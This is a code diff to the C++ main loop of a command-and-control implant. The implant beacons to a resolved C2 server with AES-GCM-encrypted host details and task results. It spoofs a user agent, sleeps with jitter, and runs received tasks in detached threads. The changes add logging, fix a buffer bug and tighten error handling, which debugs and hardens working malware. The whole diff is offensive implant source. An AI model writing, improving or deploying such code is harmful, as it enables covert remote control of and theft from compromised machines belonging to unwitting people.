@@ -61,10 +61,11 @@ namespace {
 namespace beacon {
 Beacon::Beacon() : c2FetchBackoff_(core::C2_FETCH_BACKOFF), taskDispatcher_(pendingResults_) {
     implantId_ = core::generateImplantId();
+    LOG_INFO("Implant ID: " + implantId_);
 }
 void Beacon::sleepWithJitter() {
     uint32_t h = 0; std::string host = getHostname();
-    for (char c : host) h = h * 31 + c;
+    for (char c : host) h = h * 31 + (uint32_t)c;
     std::mt19937 gen(h ^ (unsigned int)std::chrono::system_clock::now().time_since_epoch().count());
     std::normal_distribution<> d(core::SLEEP_BASE, core::SLEEP_BASE * (core::JITTER_PCT / 100.0));
     double sleep_duration = std::max(3.0, d(gen));
@@ -89,8 +90,18 @@ void Beacon::run() {
     crypto::AesGcm aes(key_vec);
     while (true) {
         if (c2Url_.empty()) {
-            try { c2Url_ = resolver.resolve(); c2FetchBackoff_ = core::C2_FETCH_BACKOFF; }
-            catch (...) { std::this_thread::sleep_for(std::chrono::duration<double>(c2FetchBackoff_)); if (c2FetchBackoff_ < 35 * 60) c2FetchBackoff_ *= 2; continue; }
+            try {
+                LOG_INFO("Resolving C2 URL...");
+                c2Url_ = resolver.resolve();
+                LOG_INFO("C2 URL: " + c2Url_);
+                c2FetchBackoff_ = core::C2_FETCH_BACKOFF;
+            }
+            catch (const std::exception& e) {
+                LOG_ERR("C2 resolution failed: " + std::string(e.what()));
+                std::this_thread::sleep_for(std::chrono::duration<double>(c2FetchBackoff_));
+                if (c2FetchBackoff_ < 35 * 60) c2FetchBackoff_ *= 2;
+                continue;
+            }
         }
         try {
             nlohmann::json payload = {{"id", implantId_}, {"os",
@@ -103,7 +114,9 @@ void Beacon::run() {
             int capped = 0; Result res;
             while (capped < 10 && pendingResults_.try_dequeue(res)) { inFlightResults_.push_back(res); capped++; }
             for (const auto& r : inFlightResults_) payload["results"].push_back({{"task_id", r.task_id}, {"output", r.output}, {"error", r.error}});
-            std::vector<BYTE> plaintext(payload.dump().begin(), payload.dump().end());
+
+            std::string payload_str = payload.dump();
+            std::vector<BYTE> plaintext(payload_str.begin(), payload_str.end());
             std::vector<BYTE> nonce(12);
 #ifdef _WIN32
             HCRYPTPROV hProv; if (CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) { CryptGenRandom(hProv, 12, nonce.data()); CryptReleaseContext(hProv, 0); }
@@ -112,8 +125,14 @@ void Beacon::run() {
 #endif
             std::vector<BYTE> ciphertext = aes.encrypt(plaintext, nonce);
             std::vector<BYTE> enc_p; enc_p.insert(enc_p.end(), nonce.begin(), nonce.end()); enc_p.insert(enc_p.end(), ciphertext.begin(), ciphertext.end());
+
             std::string server, path; std::regex re(R"(https?://([^/]+)(/.*))"); std::smatch m;
-            if (std::regex_search(c2Url_, m, re)) { server = m[1].str(); path = m[2].str(); } else { c2Url_ = ""; continue; }
+            if (std::regex_search(c2Url_, m, re)) { server = m[1].str(); path = m[2].str(); } else {
+                LOG_ERR("Failed to parse C2 URL: " + c2Url_);
+                c2Url_ = ""; continue;
+            }
+
+            LOG_INFO("Sending beacon to " + server + path);
             std::vector<BYTE> resp;
 #ifdef _WIN32
             http::WinHttpClient client(std::wstring(core::USER_AGENTS[0].begin(), core::USER_AGENTS[0].end()));
@@ -124,6 +143,7 @@ void Beacon::run() {
             resp = client.post(server, path, enc_p, h_headers);
 #endif
             if (resp.size() >= 12) {
+                LOG_INFO("Received response from C2, size: " + std::to_string(resp.size()));
                 std::vector<BYTE> r_nonce(resp.begin(), resp.begin() + 12); std::vector<BYTE> r_ctx(resp.begin() + 12, resp.end());
                 std::vector<BYTE> dec_resp = aes.decrypt(r_ctx, r_nonce);
                 nlohmann::json r_json = nlohmann::json::parse(std::string(dec_resp.begin(), dec_resp.end()));
@@ -134,11 +154,17 @@ void Beacon::run() {
                 if (r_json.contains("tasks")) {
                     for (const auto& t_j : r_json["tasks"]) {
                         Task t; t.task_id = t_j["task_id"]; t.type = stringToTaskType(t_j["type"]); t.cmd = t_j.value("cmd", "");
+                        LOG_INFO("Dispatching task: " + t.task_id);
                         std::thread(&TaskDispatcher::dispatch, &taskDispatcher_, t).detach();
                     }
                 }
+            } else {
+                LOG_ERR("Empty or invalid response from C2");
             }
-        } catch (...) {}
+        } catch (const std::exception& e) {
+            LOG_ERR("Beacon execution error: " + std::string(e.what()));
+            if (inFlightResults_.size() > 5) inFlightResults_.clear();
+        }
         sleepWithJitter();
     }
 }
